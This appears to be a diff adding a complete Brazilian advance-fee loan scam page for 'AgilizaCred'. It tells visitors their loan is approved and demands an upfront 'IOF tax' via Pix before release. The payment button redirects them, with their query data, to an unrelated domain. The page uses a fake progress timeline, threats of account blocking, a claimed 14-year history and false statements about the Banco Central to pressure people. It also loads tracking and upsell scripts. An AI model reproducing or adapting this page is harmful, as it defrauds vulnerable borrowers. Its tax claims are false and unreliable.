@@ -1,0 +1,833 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+  window.pixelId = "69853718bc934f7cb27cf6c5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pendência IOF | AgilizaCred</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --green-accent: #22C55E;
+      --green-accent-dark: #16A34A;
+      --green-accent-light: #DCFCE7;
+      --green-primary: #111827;
+      --green-dark: #1F2937;
+      --green-darker: #374151;
+      --white: #ffffff;
+      --gray-50: #f9fafb;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-500: #6b7280;
+      --gray-700: #374151;
+      --gray-900: #111827;
+      --warning: #f59e0b;
+      --warning-light: #fef3c7;
+      --danger: #dc2626;
+      --danger-light: #fef2f2;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--gray-50);
+      color: var(--gray-900);
+      min-height: 100vh;
+      line-height: 1.6;
+    }
+
+    /* Header */
+    .header {
+      background: var(--white);
+      padding: 16px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 10px rgba(34,197,94,0.08);
+      text-align: center;
+    }
+
+    .logo {
+      height: 40px;
+    }
+
+    /* Main Content */
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 20px 16px;
+    }
+
+    /* Page Title */
+    .page-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--green-primary);
+      margin-bottom: 12px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .page-title svg {
+      width: 28px;
+      height: 28px;
+      color: var(--green-accent);
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+
+    .page-desc {
+      font-size: 14px;
+      color: var(--gray-700);
+      margin-bottom: 20px;
+    }
+
+    /* Card */
+    .card {
+      background: var(--white);
+      border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      padding: 24px 20px;
+      margin-bottom: 20px;
+    }
+
+    /* Alert Danger */
+    .alert-danger {
+      background: var(--danger-light);
+      border: 1px solid #fecaca;
+      border-left: 4px solid var(--danger);
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .alert-danger svg {
+      width: 24px;
+      height: 24px;
+      color: var(--danger);
+      flex-shrink: 0;
+    }
+
+    .alert-danger-content strong {
+      color: var(--danger);
+      display: block;
+      margin-bottom: 4px;
+      font-size: 14px;
+    }
+
+    .alert-danger-content span {
+      font-size: 13px;
+      color: var(--gray-700);
+    }
+
+    /* Section Title */
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--green-primary);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title svg {
+      width: 22px;
+      height: 22px;
+      color: var(--green-accent);
+    }
+
+    .section-subtitle {
+      font-size: 13px;
+      color: var(--gray-500);
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .section-subtitle svg {
+      width: 16px;
+      height: 16px;
+    }
+
+    /* Video Container */
+    .video-container {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 24px;
+      background: #000;
+      aspect-ratio: 16/9;
+    }
+
+    .video-container video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .video-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      gap: 8px;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .video-overlay svg {
+      width: 24px;
+      height: 24px;
+    }
+
+    /* Timeline */
+    .timeline {
+      position: relative;
+      padding: 10px 0;
+      margin-bottom: 20px;
+    }
+
+    .timeline-bar {
+      position: absolute;
+      left: 15px;
+      top: 30px;
+      bottom: 30px;
+      width: 3px;
+      background: var(--gray-200);
+      border-radius: 2px;
+    }
+
+    .timeline-item {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .timeline-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .timeline-dot {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--gray-200);
+      border: 3px solid var(--white);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      z-index: 1;
+      flex-shrink: 0;
+    }
+
+    .timeline-item.done .timeline-dot {
+      background: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-dot {
+      background: var(--warning);
+      animation: pulse 2s infinite;
+    }
+
+    .timeline-item.pending .timeline-dot {
+      background: var(--gray-200);
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(245, 158, 11, 0.4); }
+      50% { box-shadow: 0 0 0 10px rgba(245, 158, 11, 0); }
+    }
+
+    .timeline-body {
+      flex: 1;
+      margin-left: 16px;
+      padding: 14px 16px;
+      background: var(--white);
+      border-radius: 12px;
+      border: 1px solid var(--gray-200);
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+    }
+
+    .timeline-item.done .timeline-body {
+      background: var(--green-accent-light);
+      border-color: rgba(34,197,94,0.3);
+    }
+
+    .timeline-item.current .timeline-body {
+      background: var(--warning-light);
+      border-color: #fde68a;
+    }
+
+    .timeline-icon {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .timeline-icon svg {
+      width: 24px;
+      height: 24px;
+      color: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-icon svg {
+      color: var(--warning);
+    }
+
+    .timeline-item.pending .timeline-icon svg {
+      color: var(--gray-500);
+    }
+
+    .timeline-text strong {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 14px;
+      color: var(--gray-900);
+      margin-bottom: 2px;
+    }
+
+    .timeline-text strong svg {
+      width: 16px;
+      height: 16px;
+      color: var(--green-accent);
+    }
+
+    .timeline-item.current .timeline-text strong svg {
+      color: var(--warning);
+    }
+
+    .timeline-text small {
+      font-size: 12px;
+      color: var(--gray-500);
+    }
+
+    /* Center Logo */
+    .center-logo {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .center-logo img {
+      height: 36px;
+    }
+
+    .center-text {
+      font-size: 13px;
+      color: var(--gray-700);
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    /* PIX Card */
+    .pix-card {
+      background: var(--green-accent-light);
+      border: 2px solid rgba(34,197,94,0.4);
+      border-radius: 16px;
+      padding: 24px 20px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .pix-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--green-primary);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .pix-title svg {
+      width: 24px;
+      height: 24px;
+      color: var(--green-accent);
+    }
+
+    .pix-subtitle {
+      font-size: 13px;
+      color: var(--gray-500);
+      margin-bottom: 16px;
+    }
+
+    .pix-value {
+      font-size: 42px;
+      font-weight: 800;
+      color: var(--green-primary);
+      margin-bottom: 20px;
+    }
+
+    /* CTA Button */
+    .btn-cta {
+      width: 100%;
+      background: var(--green-accent);
+      color: var(--white);
+      border: none;
+      padding: 18px 24px;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      font-family: 'DM Sans', sans-serif;
+      box-shadow: 0 4px 15px rgba(34,197,94,0.3);
+      transition: all 0.2s ease;
+      margin-bottom: 16px;
+    }
+
+    .btn-cta:active {
+      transform: scale(0.98);
+      background: var(--green-accent-dark);
+    }
+
+    .btn-cta svg {
+      width: 22px;
+      height: 22px;
+    }
+
+    /* Security Badge */
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 13px;
+      color: var(--gray-500);
+    }
+
+    .security-badge svg {
+      width: 18px;
+      height: 18px;
+      color: var(--green-accent);
+    }
+
+    /* FAQ */
+    .faq-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--green-primary);
+      text-align: center;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .faq-title svg {
+      width: 24px;
+      height: 24px;
+      color: var(--green-accent);
+    }
+
+    .faq-item {
+      border: 1px solid var(--gray-200);
+      border-radius: 12px;
+      margin-bottom: 12px;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      background: var(--white);
+      border: none;
+      padding: 16px;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--green-primary);
+      text-align: left;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    .faq-question svg {
+      width: 20px;
+      height: 20px;
+      color: var(--green-accent);
+      transition: transform 0.3s;
+      flex-shrink: 0;
+    }
+
+    .faq-question.active {
+      background: var(--green-accent-light);
+    }
+
+    .faq-question.active svg {
+      transform: rotate(180deg);
+    }
+
+    .faq-answer {
+      display: none;
+      padding: 0 16px 16px;
+      font-size: 13px;
+      color: var(--gray-700);
+      line-height: 1.6;
+    }
+
+    .faq-answer.show {
+      display: block;
+    }
+
+    /* Footer */
+    footer {
+      background: var(--green-primary);
+      padding: 32px 20px;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .footer-logo {
+      height: 40px;
+      margin-bottom: 16px;
+    }
+
+    .footer-info {
+      color: rgba(255,255,255,0.9);
+      font-size: 13px;
+      line-height: 1.8;
+    }
+
+    .footer-info strong {
+      color: var(--green-accent);
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div style="display:inline-flex;align-items:center;user-select:none;">
+      <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:20px;color:#111827;letter-spacing:-0.5px;">Agiliza</span><span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:20px;color:#22C55E;letter-spacing:-0.5px;">Cred</span>
+    </div>
+  </header>
+
+  <div class="container">
+    <!-- Page Title -->
+    <h1 class="page-title">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+      </svg>
+      Parabéns, falta pouco para você receber o valor na sua conta!
+    </h1>
+    <p class="page-desc">
+      Você está a um passo de receber seu empréstimo. Efetue o pagamento do imposto IOF (Imposto sobre Operações Financeiras) emitido pelo Banco Central para autorizar o saque imediatamente para sua conta.
+    </p>
+
+    <!-- Main Card -->
+    <div class="card">
+      <!-- Alert -->
+      <div class="alert-danger">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+        </svg>
+        <div class="alert-danger-content">
+          <strong>AVISO IMPORTANTE</strong>
+          <span>O não pagamento do IOF resultará no cancelamento do empréstimo e no bloqueio de futuras transações bancárias.</span>
+        </div>
+      </div>
+
+      <!-- Video Section -->
+      <div class="section-title">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path>
+        </svg>
+        O que é IOF?
+      </div>
+      <div class="section-subtitle" style="cursor:pointer;" onclick="document.getElementById('customVideo').muted = false;">
+        Clique para ativar o som
+      </div>
+
+      <div class="video-container">
+        <video id="customVideo" muted="" playsinline="" autoplay="" loop="">
+          <source src="media/X3zPz1VYh07p.mp4" type="video/mp4">
+        </video>
+      </div>
+
+      <!-- Timeline -->
+      <div class="timeline">
+        <div class="timeline-bar"></div>
+
+        <!-- Item 1 - Done -->
+        <div class="timeline-item done">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                <svg fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                </svg>
+                Simulação
+              </strong>
+              <small>Simulação realizada e cadastro concluído</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 2 - Done -->
+        <div class="timeline-item done">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                <svg fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+                </svg>
+                Pagamento do Seguro
+              </strong>
+              <small>Pagamento concluído com sucesso</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 3 - Current -->
+        <div class="timeline-item current">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Pagamento do Imposto IOF
+              </strong>
+              <small>Aguardando pagamento para liberação do crédito</small>
+            </div>
+          </div>
+        </div>
+
+        <!-- Item 4 - Pending -->
+        <div class="timeline-item pending">
+          <div class="timeline-dot"></div>
+          <div class="timeline-body">
+            <div class="timeline-icon">
+              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+              </svg>
+            </div>
+            <div class="timeline-text">
+              <strong>Crédito na conta</strong>
+              <small>Crédito enviado para sua conta bancária</small>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Center Logo -->
+      <div class="center-logo">
+        <div style="display:inline-flex;align-items:center;user-select:none;">
+          <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:18px;color:#111827;letter-spacing:-0.5px;">Agiliza</span><span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:18px;color:#22C55E;letter-spacing:-0.5px;">Cred</span>
+        </div>
+      </div>
+      <p class="center-text">
+        O não pagamento do imposto resulta no cancelamento do contrato do empréstimo, impossibilitando uma nova contratação por um prazo máximo de 90 dias.
+      </p>
+    </div>
+
+    <!-- PIX Card -->
+    <div class="pix-card">
+      <div class="pix-title">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="m15.45 16.52l-3.01-3.01c-.11-.11-.24-.13-.31-.13s-.2.02-.31.13L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.08.08.2.13.31.13s.23-.05.31-.13l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"></path>
+          <path d="m21.11 9.85l-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.28.28-.65.42-1.02.42a1.5 1.5 0 0 1-1.02-.42L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.28-.28.65-.42 1.02-.42s.74.14 1.02.42l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"></path>
+        </svg>
+        Pague via Pix
+      </div>
+      <p class="pix-subtitle">O pagamento será confirmado imediatamente</p>
+      <div class="pix-value">R$ 23,44</div>
+      
+      <button onclick="redirect()" class="btn-cta">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+        </svg>
+        Pagar agora
+      </button>
+
+      <div class="security-badge">
+        <svg fill="currentColor" viewBox="0 0 20 20">
+          <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+        </svg>
+        Ambiente seguro — AgilizaCred
+      </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="card">
+      <div class="faq-title">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+        </svg>
+        Dúvidas Frequentes
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question active" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          Por que o imposto IOF não é descontado do empréstimo?
+        </button>
+        <div class="faq-answer show">
+          O valor do Imposto IOF é tratado separadamente pois ele é um imposto emitido pelo Banco Central assim que um empréstimo é aprovado, e é destinado aos cofres públicos, para garantir segurança para ambas as partes.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          O que acontece após pagar o imposto?
+        </button>
+        <div class="faq-answer">
+          Você será redirecionado automaticamente para a página onde confirmará e autorizará a transferência do dinheiro para sua conta.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          Quanto tempo demora para liberar o crédito?
+        </button>
+        <div class="faq-answer">
+          Como o pagamento é feito via Pix, a liberação do empréstimo é imediata. Todo o processo, incluindo a transferência do crédito, leva cerca de 5-10 minutos.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          É seguro fazer o pagamento?
+        </button>
+        <div class="faq-answer">
+          <strong>AgilizaCred</strong> atua há mais de <strong>14 anos</strong> com empréstimos online, contando com milhares de clientes satisfeitos. Nosso site é seguro e confiável. Não solicitamos sua senha ou dados bancários sensíveis.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          <svg fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+          </svg>
+          O que acontece se eu não pagar o imposto?
+        </button>
+        <div class="faq-answer">
+          Se você não pagar o imposto, seu pedido de empréstimo será cancelado, mas lembre-se de que o imposto IOF é obrigatório pelo Banco Central, para garantir a segurança e processamento do seu pedido.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer style="background:#fff;border-top:1px solid #e5e7eb;padding:32px 20px;text-align:center;margin-top:20px;">
+    <div style="display:inline-flex;align-items:center;user-select:none;margin-bottom:12px;">
+      <span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:15px;color:#6B7280;letter-spacing:-0.5px;">Agiliza</span><span style="font-family:'Plus Jakarta Sans',sans-serif;font-weight:800;font-size:15px;color:#22C55E;letter-spacing:-0.5px;">Cred</span>
+    </div>
+    <div class="footer-info" style="color:#6B7280;">
+      <strong style="color:#111827;">AgilizaCred Soluções Financeiras Ltda.</strong><br>
+      CNPJ: 36.947.229/0001-85<br>
+      São Paulo, SP – 01310-200
+    </div>
+  </footer>
+
+  <script>
+    // Carregar dados do usuário
+
+    // Redirect
+    function redirect() {
+      const checkoutParams = new URLSearchParams(window.location.search);
+      window.location.href = 'https://pay.acesso-segurovf.site/BNjzgPARWze3M78?' + checkoutParams.toString();
+    }
+
+    // Toggle FAQ
+    function toggleFaq(button) {
+      const answer = button.nextElementSibling;
+      const isActive = button.classList.contains('active');
+      
+      // Close all
+      document.querySelectorAll('.faq-question').forEach(q => q.classList.remove('active'));
+      document.querySelectorAll('.faq-answer').forEach(a => a.classList.remove('show'));
+      
+      // Open clicked if it was closed
+      if (!isActive) {
+        button.classList.add('active');
+        answer.classList.add('show');
+      }
+    }
+
+    // Video Player - Auto unmute on click
+    const video = document.getElementById('customVideo');
+    if (video) {
+      video.addEventListener('click', () => {
+        video.muted = !video.muted;
+      });
+    }
+
+    // Inicializar
+    
+  </script>
+  <script src="js/upsells.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    initUpsell(4);
+    });
+    </script>
+
+
+</body></html>
